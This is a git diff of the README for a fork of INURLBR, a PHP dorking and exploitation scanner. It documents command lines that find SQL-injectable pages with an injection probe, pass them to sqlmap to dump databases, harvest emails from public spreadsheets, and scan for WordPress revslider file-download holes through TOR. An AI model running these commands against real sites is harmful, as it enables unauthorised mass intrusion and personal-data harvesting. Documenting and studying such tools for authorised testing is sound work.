@@ -1,52 +1,73 @@
-SCANNER - INURLBR
-===============
 
+
+<p style="text-align:center" align="center">
+<img src="https://lh3.googleusercontent.com/-uB97QnHQ-VY/YGYWDRmUK0I/AAAAAAAAAsI/f3BH8Kv8kvMvlrulgsbtkRsAbgHpB3mKACLcBGAsYHQ/logo2.png" width="70%" />
+<p>
+
+
+> **This is a fork of the original [project](https://github.com/googleinurl/SCANNER-INURLBR).**
+>
 >Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found.
+## Disclaimer
 ```
-   +-----------------------------------------------------------------------------+
-   |  [!] Legal disclaimer: Usage of INURLBR for attacking targets without prior |
-   |  mutual consent is illegal.                                                 |
-   |  It is the end user's responsibility to obey all applicable local, state and|
-   |  federal laws.                                                              |
-   |  Developers assume no liability and are not responsible for any misuse or   |
-   |  damage caused by this program                                              |
-   +-----------------------------------------------------------------------------+
-```
-
-
-```
-  [+] AUTOR:        googleINURL
-  [+] EMAIL:        inurlbr@gmail.com
-  [+] Blog:         http://blog.inurl.com.br
-  [+] Twitter:      https://twitter.com/googleinurl
-  [+] Fanpage:      https://fb.com/InurlBrasil
-  [+] Pastebin      http://pastebin.com/u/Googleinurl
-  [+] GIT:          https://github.com/googleinurl
-  [+] PSS:          http://packetstormsecurity.com/user/googleinurl
-  [+] EXA:          http://exploit4arab.net/author/248/Cleiton_Pinheiro
-  [+] YOUTUBE:      http://youtube.com/c/INURLBrasil
-  [+] PLUS:         http://google.com/+INURLBrasil
+This or previous program is for Educational purpose ONLY. Do not use it without permission. 
+The usual disclaimer applies, especially the fact that me (MrCl0wnLab) is not liable for any 
+damages caused by direct or indirect use of the information or functionality provided by these 
+programs. The author or any Internet provider bears NO responsibility for content or misuse 
+of these programs or any derivatives thereof. By using these programs you accept the fact 
+that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these 
+programs is not MrCl0wnLab's responsibility.
 ```
 
- * GROUP INURL BRASIL - ADVANCED SEARCH.
- * SCRIPT NAME:        INURLBR
- * Codename:           Subversive
- * Version:            2.1.0
-
-
-- Screenshot:
-------
-![Screenshot](http://3.bp.blogspot.com/-H1DjYjXjqXU/VWPNTUnfeaI/AAAAAAAAA_E/B24JDIxrq3o/s1600/inurlbr.png)
-![Screenshot](http://4.bp.blogspot.com/-XAohC-ga9EM/VWU1l3a3QcI/AAAAAAAAA_o/BRg0mIllOgQ/s1600/sqlmap.png)
-![Screenshot](http://4.bp.blogspot.com/-bOOilZLyUFg/VWQCdHKCAwI/AAAAAAAAA_U/JAy1ChdQJU0/s1600/post.png)
-![Screenshot](http://2.bp.blogspot.com/-kCYgptMhfts/VWU2eTTTKFI/AAAAAAAAA_w/eGSt7qg4HRo/s1600/exploits.png)
-- LIB & PERMISSION:
-------
+```properties
+Autor:    MrCl0wn
+Blog:     https://blog.mrcl0wn.com
+GitHub:   https://github.com/MrCl0wnLab
+Twitter:  https://twitter.com/MrCl0wnLab
+Email:    mrcl0wnlab\@\gmail.co
+Script:   INURLBR
+Codename: Facada
+Version:  3.0.0
 ```
+
+## Screenshots
+![Screenshot](https://1.bp.blogspot.com/-WswyqXamP44/YGYofFT6siI/AAAAAAAAAso/ea-3nf6OEqQxMw-dpEuIKedzwT7B5d0rwCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-08-08.png)
+### Email extraction
+```bash
+php inurlbr.php  --dork '"com.br" contato  .xlsx' -m  -s emails.txt -q all
+```
+![Screenshot](https://1.bp.blogspot.com/-K_7F9nngSDk/YGYn30s1SHI/AAAAAAAAAsg/4k9NrPpBrognZ6kjx0WqeZo591X3nCydwCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-01-03.png)
+
+### External Command
+```bash
+php inurlbr.php --dork '"com.br" index.php?id id' -s sqlmap.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap-dev/sqlmap.py -u "_TARGETFULL_" --dbs --batch --threads 10 -p id --random-agent'
+```
+![Screenshot](https://1.bp.blogspot.com/-dz8I8p2Aies/YGYr_yZ8x3I/AAAAAAAAAsw/cHq4KS8E6AwK7l66EsykqFgvWyXjtJqVACLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-18-39.png)
+
+### Filter Result Value
+```bash
+php inurlbr.php --dork '"com.br/wp-login.php"' -t 2  -a 'wp-login.php?action=lostpassword' -s filter_string.txt
+```
+![Screenshot](https://1.bp.blogspot.com/-vzZbwf_KobA/YGY8KQJCJwI/AAAAAAAAAs4/6jt1cse_4Goz3pfNeB1un4tmhRkKfnkVgCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B18-31-58.png)
+
+### Simple fuzz 
+```bash
+php inurlbr.php --target 'https://YOUR_TARGET' -o fuzz.txt -s php_result.txt -t 2 -a 'phpMyAdmin 2.11.4'
+```
+![Screenshot](https://1.bp.blogspot.com/-bajxhdjFMbI/YGZaj1Cj9MI/AAAAAAAAAtA/Z3trH2lq3mEPcwtfoekdS7OanLfDrcZhQCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B20-41-09.png)
+
+### Parallel terminal ( popup )
+```bash
+php inurlbr.php --target 'https://YOUR_TARGET' -o fuzz.txt -s popup_result.txt -t 2 -a 'phpMyAdmin 2.11.4' --command-vul "nmap -sV -v  _TARGET_ ;"  --popup 
+```
+![Screenshot](https://1.bp.blogspot.com/-AFOmlAmYzUg/YGZgaNOY2II/AAAAAAAAAtI/twy2icF7kTo6N2YPKzOQojptIZYTCmbywCLcBGAsYHQ/s2057/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B21-05-40.png)
+
+## Lib & Permission
+```properties
  ----------------------------------------------------------
-PHP Version         5.4.7
-php5-curl           LIB
-php5-cli            LIB   
+PHP Version         7.4.16
+php5 curl           LIB
+php5 cli            LIB   
 cURL support        enabled
 cURL Information    7.24.0
 allow_url_fopen     On
@@ -56,15 +77,14 @@ Operating system    LINUX
 Proxy random        TOR 
  ----------------------------------------------------------
 [+] PERMISSION EXECUTION: chmod +x inurlbr.php
-[+] INSTALLING LIB CURL: sudo apt-get install php5-curl
-[+] INSTALLING LIB CLI: sudo apt-get install php5-cli
+[+] INSTALLING LIB CURL: sudo apt-get install php7-curl
+[+] INSTALLING LIB CLI: sudo apt-get install php7-cli
 [+] INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en
  ----------------------------------------------------------
-resume: apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl
+resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
 ```
-- HELP:
-------
-```
+## Help
+```properties
 -h
 --help   Alternative long length help command.
 --ajuda  Command to specify Help.
@@ -72,7 +92,7 @@ resume: apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl
 --update Code update.    
 -q       Choose which search engine you want through [1...24] / [e1..6]]:
      [options]:
-     1   - GOOGLE / (CSE) GENERIC RANDOM / API
+     1   - GOOGLE
      2   - BING
      3   - YAHOO BR
      4   - ASK
@@ -223,7 +243,7 @@ resume: apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl
      Example: -a {string}
      Usage:   -a '<title>hello world</title>'
      
- -d  Specify the script usage op 1, 2, 3, 4, 5.
+ -d  Specify debug op 1, 2, 3, 4, 5.
      Example: -d {op}
      Usage:   -d 1 /URL of the search engine.
               -d 2 /Show all the url.
@@ -493,9 +513,9 @@ resume: apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl
 ```
 
 
-- COMMANDS SIMPLE:
-------
-```
+
+## Commands
+```properties
 ./inurlbr.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"  
    
 ./inurlbr.php --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;" 
@@ -557,34 +577,46 @@ resume: apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl
 ./inurlbr.php --dork-file 'dorks_Wordpress_revslider.txt' -s output.txt -q 1,2,6,4,5,9,7,8  --sub-file 'xpls_Arbitrary_File_Download.txt'  
 ```
 
-- Installation
-----
-Preferably, you can download inurlbr by cloning the [Git](https://github.com/googleinurl/SCANNER-INURLBR) repository:
+## Installation
+Preferably, you can download inurlbr by cloning the [Git](https://github.com/MrCl0wnLab/SCANNER-INURLBR) repository:
+```properties
+git clone https://github.com/MrCl0wnLab/SCANNER-INURLBR.git inurlbr
 ```
-    git clone https://github.com/googleinurl/SCANNER-INURLBR.git inurlbr
-```
-The inurlbr works with [php](http://php.net/downloads.php) version **5.4.x**  linux platforms.
+The inurlbr works with [php](http://php.net/downloads.php) version **7.x**  linux platforms.
 
-- Giving permission to script execution:
-------
-```
+## Giving permission to script execution
+```properties
 $chmod +x inurlbr.php
-Executar: ./inurlbr.php
+Run: ./inurlbr.php
 ```
 
-- Usage
-----
+## Setting your token ipinfo
+It is possible to register more than one token
+```bash
+./resources/token.ipinfo.inurl
+```
+## Setting your strings
+You can register more validation strings
+```bash
+./resources/strings.validation.inurl
+```
 
+## Setting your filter strings
+You can register more filter values that dirty your results
+```bash
+./resources/trash_list.validation.inurl
+```
+
+## Usage
 To get a list of basic options and switches use:
-```
-    php inurlbr.php -h
+```properties
+php inurlbr.php -h
 ```
 To get a list of all options and switches use:
+```properties
+php inurlbr.php --help
+php inurlbr.php --info
 ```
-    php inurlbr.php --help
-```
-
 
 * Demos: [http://youtube.com/c/INURLBrasil](https://www.youtube.com/playlist?list=PLV1376pVwcCmcoCmq_Z4O0ra4BqjmhIaR)
 * Tutoriais: [http://blog.inurl.com.br/search/label/INURLBR](http://blog.inurl.com.br/search/label/INURLBR)
-* IRC: irc.rizon.net / #inurlbrasil
